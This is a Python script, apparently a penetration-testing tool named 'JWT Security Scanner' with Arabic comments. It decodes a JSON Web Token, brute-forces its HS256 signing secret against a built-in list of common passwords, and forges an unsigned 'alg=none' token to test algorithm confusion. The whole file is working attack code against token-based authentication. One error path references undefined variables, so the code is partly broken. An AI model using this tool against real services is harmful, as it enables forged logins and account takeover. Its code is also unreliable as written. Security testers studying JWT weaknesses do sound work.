#!/usr/bin/env python3
import base64
import json
import sys
import hmac
import hashlib

# كلمات سر شائعة
COMMON_SECRETS = [
    'secret', 'password', '123456', 'admin', 'key', 'jwt',
    'secretkey', 'your-256-bit-secret', 'your_jwt_secret',
    'jwt_secret', 'supersecret', 'mysecret', 'test',
    'changeme', 'default', 'private', 'public', 'token',
    'jwtkey', 'jwt-secret', 'jsonwebtoken', 'auth',
    'authentication', 'access_token', 'api_key', 'apikey',
]

def decode_jwt(token):
    """يفك JWT"""
    parts = token.split('.')
    if len(parts) != 3:
        return None, None, None
    
    def b64_decode(s):
        padding = 4 - (len(s) % 4)
        if padding != 4:
            s += '=' * padding
        return base64.urlsafe_b64decode(s)
    
    try:
        header = json.loads(b64_decode(parts[0]))
        payload = json.loads(b64_decode(parts[1]))
        signature = parts[2]
        return header, payload, signature
    except:
        return None, None, None

def encode_jwt(header, payload, secret, algorithm='HS256'):
    """يصنع JWT"""
    def b64_encode(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
    
    header_b64 = b64_encode(header)
    payload_b64 = b64_encode(payload)
    message = f"{header_b64}.{payload_b64}"
    
    if algorithm == 'none':
        signature = ''
    elif algorithm == 'HS256':
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        signature = base64.urlsafe_b64encode(sig).decode().rstrip('=')
    else:
        return None
    
    return f"{message}.{signature}"

def crack_secret(token):
    """يحاول يكسر كلمة السر"""
    header, payload, signature = decode_jwt(token)
    if not header:
        return None
    
    algorithm = header.get('alg', 'HS256')
    if algorithm != 'HS256':
        print(f"  [!] Algorithm: {algorithm} (only HS256 supported)")
        return None
    
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}"
    original_sig = parts[2]
    
    print(f"  [*] Trying {len(COMMON_SECRETS)} common secrets...")
    
    for secret in COMMON_SECRETS:
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
        if sig_b64 == original_sig:
            return secret
    
    return None

def test_algorithm_confusion(token):
    """يختبر algorithm confusion"""
    header, payload, signature = decode_jwt(token)
    if not header:
        return None
    
    # جرب none algorithm
    none_header = dict(header)
    none_header['alg'] = 'none'
    none_token = encode_jwt(none_header, payload, '', 'none')
    
    return none_token

def analyze_jwt(token):
    print(f"\n{'='*60}")
    print(f"  JWT Security Scanner")
    print(f"{'='*60}\n")
    
    print(f"[*] Token: {token[:80]}...\n")
    
    # فك التوكن
    header, payload, signature = decode_jwt(token)
    
    if not header:
        print(f"  {R}[-] Invalid JWT format{RESET}")
        return
    
    print(f"[+] Header:")
    print(f"    {json.dumps(header, indent=4)}\n")
    
    print(f"[+] Payload:")
    print(f"    {json.dumps(payload, indent=4)}\n")
    
    # فحص algorithm
    alg = header.get('alg', 'unknown')
    print(f"[*] Algorithm: {alg}")
    
    if alg == 'none':
        print(f"  [!] CRITICAL: alg=none is insecure!")
    
    # كسر كلمة السر
    if alg == 'HS256':
        print(f"\n[*] Cracking secret...")
        secret = crack_secret(token)
        if secret:
            print(f"  [!] SECRET FOUND: {secret}")
        else:
            print(f"  [-] Secret not found in common list")
    
    # algorithm confusion
    print(f"\n[*] Testing algorithm confusion...")
    none_token = test_algorithm_confusion(token)
    if none_token:
        print(f"  [!] None algorithm token generated")
        print(f"      {none_token[:80]}...")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_scanner.py <JWT_TOKEN>")
        print("Example: python3 jwt_scanner.py 'eyJhbGciOiJIUzI1NiIs...'")
        sys.exit(1)
    analyze_jwt(sys.argv[1])
